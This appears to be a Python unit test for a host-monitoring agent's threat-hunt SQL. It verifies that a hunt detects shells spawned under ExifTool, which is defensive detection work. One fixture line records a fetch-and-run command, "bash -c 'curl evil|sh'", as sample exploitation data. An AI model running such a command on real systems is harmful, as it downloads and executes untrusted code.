#!/usr/bin/env python3
"""Advisory-hunt SQL must stay valid against the history schema — and actually catch what it claims.

Advisory hunts (ADVISORY_HUNTS) are code-maintained, pinned to the top of the Hunt tab, and their SQL
runs against each host's recorded history DB. A column renamed in HISTORY_SCHEMA, or a typo in a hunt,
would surface only when an operator clicks the hunt in anger. This executes every advisory hunt's SQL
against the real schema (empty tables — we assert it PARSES and all tables/columns resolve), then seeds
one real exiftool->shell chain and asserts the exploitation hunt catches both the exec-history self-join
and the live-process path, with no false positive on a benign chain.

Pure stdlib. Run from the repo root:  python3 -m unittest discover -s tests -v
"""
import os
import sqlite3
import sys
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import agent  # noqa: E402


def _schema_conn():
    con = sqlite3.connect(":memory:")
    con.executescript(agent.HISTORY_SCHEMA)
    return con


class AdvisorySqlResolves(unittest.TestCase):
    def test_every_advisory_hunt_sql_runs_against_the_schema(self):
        con = _schema_conn()
        self.assertTrue(agent.ADVISORY_HUNTS)
        for adv in agent.ADVISORY_HUNTS:
            for hn in adv["hunts"]:
                sql = (hn.get("sql") or "").strip()
                self.assertTrue(sql, "%s/%s missing sql" % (adv["id"], hn["name"]))
                try:
                    con.execute(sql).fetchall()   # empty tables; proves it parses + columns resolve
                except sqlite3.Error as e:
                    self.fail("%s/%s SQL error: %s" % (adv["id"], hn["name"], e))


class ExiftoolExploitationHunt(unittest.TestCase):
    def setUp(self):
        self.adv = next(a for a in agent.ADVISORY_HUNTS if a["id"] == "exiftool-shell-2026-11")
        self.exploit_sql = self.adv["hunts"][1]["sql"]   # "A shell or interpreter spawned under ExifTool"
        self.con = _schema_conn()
        self.now = int(time.time())

    def _exec(self, eid, pid, ppid, exe, cmdline):
        self.con.execute(
            "INSERT INTO exec_events(id,ts,pid,ppid,exe,cmdline,uid,signing_id,platform,first_seen,last_seen)"
            " VALUES(?,?,?,?,?,?,?,?,?,?,?)",
            (eid, self.now, pid, ppid, exe, cmdline, 0, "", 1, self.now, self.now))

    def _proc(self, name, exe, ppid_name):
        cols = {r[1] for r in self.con.execute("PRAGMA table_info(processes)")}
        vals = {"name": name, "exe": exe, "cmdline": name, "user": "www",
                "ppid_name": ppid_name, "first_seen": self.now, "last_seen": self.now}
        vals = {k: v for k, v in vals.items() if k in cols}
        self.con.execute("INSERT INTO processes(%s) VALUES(%s)" % (",".join(vals), ",".join("?" * len(vals))),
                         tuple(vals.values()))

    def test_catches_exec_history_chain(self):
        # exiftool (via perl) -> bash, recorded in exec history
        self._exec("e1", 100, 9, "/usr/bin/perl", "exiftool /uploads/evil.djvu")
        self._exec("e2", 101, 100, "/bin/bash", "bash -c 'curl evil|sh'")
        rows = self.con.execute(self.exploit_sql).fetchall()
        self.assertTrue(any("/bin/bash" in str(r) for r in rows))

    def test_catches_live_process_chain(self):
        # a shell whose live parent name is exiftool
        self._proc("sh", "/bin/sh", "exiftool")
        rows = self.con.execute(self.exploit_sql).fetchall()
        self.assertTrue(any("/bin/sh" in str(r) for r in rows))

    def test_no_false_positive_on_benign_chain(self):
        # a normal interactive shell running ls — parent is a shell, not exiftool
        self._exec("e3", 201, 9, "/bin/zsh", "zsh")
        self._exec("e4", 202, 201, "/bin/ls", "ls")
        rows = self.con.execute(self.exploit_sql).fetchall()
        self.assertFalse(any("/bin/ls" in str(r) for r in rows))


if __name__ == "__main__":
    unittest.main(verbosity=2)
